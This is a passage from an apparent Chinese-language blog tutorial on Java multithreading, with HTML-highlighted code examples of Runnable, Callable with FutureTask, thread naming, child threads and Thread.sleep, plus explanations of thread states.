class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Runnable接口多线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread1</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123; <span class="comment">//主体类</span></span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyThread1</span><span class="params">(String title)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.title = title;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123; <span class="comment">//线程的主体方法</span></span><br><span class="line">            System.out.printf(<span class="built_in">this</span>.title + <span class="string">&quot;运行，x =&quot;</span> + x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">threadA</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyThread1</span>(<span class="string">&quot;线程对象A&quot;</span>));</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">threadB</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyThread1</span>(<span class="string">&quot;线程对象B&quot;</span>));</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">threadC</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">MyThread1</span>(<span class="string">&quot;线程对象C&quot;</span>));</span><br><span class="line">        threadA.start();</span><br><span class="line">        threadB.start();</span><br><span class="line">        threadC.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073800.jpg"                      alt="image-20220805223853643"                ></p><p>​    多线程的设计之中，使用了代理设计模式的结构，用户自定义的线程主体只是负责项目核心功能的实现，而所有的辅助实现全部交由 Thread 类来处理。</p><p>​    在进行 Thread 启动多线程的时候调用的是 start() 方法，而后找到的是 run()方法。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073801.jpg"                      alt="image-20220805224532536"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073802.jpg"                      alt="image-20220805224859495"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073803.jpg"                      alt="image-20220805224951310"                ></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073805.jpg"                      alt="image-20220805225009766"                ></p><p>​    当通过 Thread 类的构造方法传递了一个 Runnable 接口对象的时候，那么该接口对象将被 Thread 类中的 target 属性所保存，在 start() 方法执行的时候会调用Thread类中的 run() 方法</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73806.jpg"                      alt="image-20220805225527984"                ></p><p>​    而这个 run() 方法去调用 Runnable 接口子类被覆写过的 run() 方法。</p><p>​    <strong>多线程开发的本质实质上是在于多个线程可以进行同一资源的抢占，那么 Thread 主要描述的是线程,而资源的描述是通过 Runnable 完成的。</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073808.jpg"                      alt="image-20220805230142734"                ></p><p>范例:利用卖票程序来实现多个线程的资源并发访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Thread和Runnable的关系</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread2</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123; <span class="comment">//线程的主体类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123; <span class="comment">//线程的主体方法</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">100</span>; x++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.ticket &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;卖票,ticket = &quot;</span> + <span class="built_in">this</span>.ticket--);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyThread2</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread2</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt).start(); <span class="comment">//第一个线程启动</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt).start(); <span class="comment">//第二个线程启动</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt).start(); <span class="comment">//第三个线程启动</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073811.jpg"                      alt="image-20220805231250385"                ></p><p>​    通过内存分析图来分析本程序的执行结构。</p><p>​    <img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073812.jpg"                      alt="image-20220805231810455"                ></p><h4 id="Callable接口实现多线程"><a href="#Callable接口实现多线程" class="headerlink" title="Callable接口实现多线程"></a>Callable接口实现多线程</h4><p>​    从最传统的开发来讲如果要进行多线程的实现肯定依靠的就是 Runnable。</p><p>​    但是 Runnable 接口有一个缺点：当线程执行完毕之后后无法获取一个返回值，所以从 JDK 1.5 之后就提出了一个新的线程实现接口:java.util.concurrent.Collable 接口。</p><p>​    观察接口的定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FunctionalInterface</span>.</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">callable</span>&lt;V&gt; &#123;</span><br><span class="line"><span class="keyword">public</span> V <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    可以发现 Callable 定义的时候可以设置一个泛型，此泛型的类型就是返回数据的类型，这样的好处是可以避免向下转型所带来的安全隐患。</p><p>Callable接口和Thread类关系实现关系图</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073814.jpg"                      alt="image-20220806022312871"                ></p><p>范例：使用Callable实现线程处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用Callable实现线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Callable;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.FutureTask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread3</span> <span class="keyword">implements</span> <span class="title class_">Callable</span>&lt;String&gt;&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>;x&lt;<span class="number">10</span>;x++)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;**********线程执行、x= &quot;</span> + x);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;线程执行完毕&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ExecutionException, InterruptedException &#123;</span><br><span class="line">        FutureTask&lt;String&gt; task = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">MyThread3</span>());</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(task).start();</span><br><span class="line">        System.out.println(<span class="string">&quot;【线程返回数据】&quot;</span> + task.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073815.jpg"                      alt="image-20220806023043230"                ></p><p>​    <strong>请解释 Runnable 与  Callable 的区别?</strong></p><p>​    <strong>1.Runnable 是在 JDK1.0的时候提出的多线程的实现接口，而 Callable 是在 JDK 1.5之后提出的；</strong></p><p>​    <strong>2.java.lang.Runnable 接口之中只提供有一个 run()方法，并且没有返回值;</strong></p><p>​    <strong>3.java.util.concurrent.Callable 接口提供有 call()方法，可以有返回值;</strong></p><h4 id="多线程运行状态"><a href="#多线程运行状态" class="headerlink" title="多线程运行状态"></a>多线程运行状态</h4><p>​    对于多线程的开发而言，编写程序的过程之中总是按照：</p><p>​    定义线程主体类，而后通过Thread类进行线程，但是并不意味着你调用了start()方法，线程就已经开始运行了，因为整体的线程处理有自己的一套运行的状态。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073817.jpg"                      alt="image-20220806024108159"                ></p><ol><li> 任何一个线程的对象都应该使用Thread类进行封装，所以线程的启动使用的是start()，但是启动的时候实际上若干个线程都将进入到一种就绪状态，现在并没有执行；</li><li> 进入到就绪状态之后就需要等待进行资源的调度，当某一个线程调度成功之后侧进入到运行状态（run()方法），但是所有的线程不可能一直持续执行下去，中间需要产生一些暂停的状态，例如：某个线程执行一段时间之后就需要让出资源；而后这个线程就进入到阻塞状态随后重新回归到就绪状态；</li><li> 当run()方法执行完毕之后，实际上该线程的主要任务也就结束了，那么此时就可以直接进入到停止状态。</li></ol><hr><h3 id="线程常用操作方法"><a href="#线程常用操作方法" class="headerlink" title="线程常用操作方法"></a>线程常用操作方法</h3><p>​    多线程的主要操作方法都在Thread类中定义了。</p><h4 id="线程的命名和取得"><a href="#线程的命名和取得" class="headerlink" title="线程的命名和取得"></a>线程的命名和取得</h4><p>​    多线程的运行状态是不确定的，那么在程序开发之中为了可以获取到一些需要使用的线程就只能依靠线程的名字来进行操作。所以线程的名字是一个至关重要的概念，这样在Thread类之中就提供有线程名称的处理。</p><p>​    <strong>·构造方法：public Thread(Runnable target,String name);</strong></p><p>​    <strong>·设置名字：public final void setName(String name);</strong></p><p>​    <strong>·取得名字：public final String getName()；</strong></p><p>​    对于线程对象的获得是不可能只靠一个this来完成的，因为线程的状态不可控，但是有一点是明确的，所有的线程对象都一定要执行run（）方法，那么这个时候可以考虑获取当前线程，在Thread类里面提供有获取当前线程的一个方法。</p><p>​    <strong>·获取当前线程：public static Thread currentThread():</strong></p><p>范例：观察线程的命名操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程的命名与取得</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread4</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyThread4</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread4</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;线程A&quot;</span>).start(); <span class="comment">//设置了线程的名字</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt).start(); <span class="comment">//未设置线程名字</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt,<span class="string">&quot;线程B&quot;</span>).start(); <span class="comment">//设置了线程的名字</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73818.jpg"                      alt="image-20220806155259068"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">MyThread4</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread4</span>();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(mt, <span class="string">&quot;线程A&quot;</span>).start(); <span class="comment">//设置了线程的名字</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(mt).start(); <span class="comment">//未设置线程名字</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(mt).start(); <span class="comment">//未设置线程名字</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(mt).start(); <span class="comment">//未设置线程名字</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(mt).start(); <span class="comment">//未设置线程名字</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(mt).start(); <span class="comment">//未设置线程名字</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Thread</span>(mt, <span class="string">&quot;线程B&quot;</span>).start(); <span class="comment">//设置了线程的名字</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073819.jpg"                      alt="image-20220806164156987"                ></p><p>​    当开发者为线程设置名字的时候，而如果没有设置名字，则会自动生成一个不重复的名字，这种自动的属性命名主要是依靠了static属性完成的，在Thread类里面定义了如下操作：</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073820.jpg"                      alt="image-20220806164259748"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Thread</span><span class="params">(Runnable target)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(<span class="literal">null</span>, target, <span class="string">&quot;Thread-&quot;</span> + nextThreadNum(), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-73821.jpg"                      alt="image-20220806164332896"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> threadInitNumber;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">nextThreadNum</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> threadInitNumber++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    上面两个操作也就是完成自动编号的原理。</p><p>范例：观察一个程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程的命名与取得</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread4</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(Thread.currentThread().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MyThread4</span> <span class="variable">mt</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyThread4</span>();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(mt, <span class="string">&quot;线程对象&quot;</span>).start(); <span class="comment">//设置了线程的名字</span></span><br><span class="line">        mt.run();<span class="comment">//对象直接调用run()方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073822.jpg"                      alt="image-20220806165207781"                ></p><p>​    通过此时的代码可以发现当使用了“mt.run()”直接在主方法中调用线程类对象中的run()方法所获得的线程对象的名字为“main”，所以可以得出一个结论：<strong>主方法也是一个线程</strong>。那么现在的问题来了，所有的线程都是在进程上的划分，那么进程在哪里？</p><p>​    <strong>事实上，每当使用Java命令执行程序的时候就表示启动了一个JVM的进程，一台电脑上可以同时启动若干个JVM进程所以每一个JVM的进程都会有各自的线程。</strong></p><p>​    <strong>在任何的开发之中，主线程可以创建若干个子线程，创建子线程的目的是可以将一些复杂逻辑或者比较耗时的逻辑交给子线程处理；</strong></p><p>范例：子线程的处理</p><p>原本代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子线程的处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1、操作任务一。&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; Integer.MAX_VALUE; x++) &#123;</span><br><span class="line">            temp += x;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;2、操作任务二。&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;n、操作任务N。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-073823.jpg"                      alt="image-20220806170331055"                ></p><p>​    在执行过程中，操作任务一与二中间会耽误一下，我们就需要启动一个子线程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子线程的处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1、操作任务一。&quot;</span>);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; Integer.MAX_VALUE; x++) &#123;</span><br><span class="line">                temp += x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        System.out.println(<span class="string">&quot;2、操作任务二。&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;n、操作任务N。&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    主线程负责处理整体流程，而子线程负责处理耗时流程。</p><h4 id="线程的休眠"><a href="#线程的休眠" class="headerlink" title="线程的休眠"></a>线程的休眠</h4><p>​    如果现在希望某一个线程可以暂缓执行，那么可以使用休眠的处理。在 Thread 类之中定义的休眠的方法如下：</p><p>​    休眠1:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(<span class="type">long</span> millis)</span> <span class="keyword">throws</span> InterruptedException;</span><br></pre></td></tr></table></figure><p>​    休眠2:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">(<span class="type">long</span> mills,<span class="type">int</span> nanos)</span> <span class="keyword">throws</span> InterruptedException;</span><br></pre></td></tr></table></figure><p>​    在进行休眠的时候有可能会产生中断异常“InterruptedException”,中断异常属于Exception 的子类，所以证明该异常必须进行休眠处理。</p><p>范例：观察休眠处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> three;</span><br><span class="line"></span><br><span class="line"><span class="comment">//线程的休眠</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;、 x = &quot;</span> + x);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">100</span>); <span class="comment">//暂缓执行</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;线程对象&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    暂缓执行之后执行慢了，休眠时间一到程序马上回复继续执行。</p><p>​    休眠的主要特点是可以自动实现线程的唤醒，以继续进行后续的处理。但是需要注意的是，如果现在你有多个线程对象，那么休眠也是有先后顺序的。</p><p>范例：产生多个线程对象进行休眠处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span 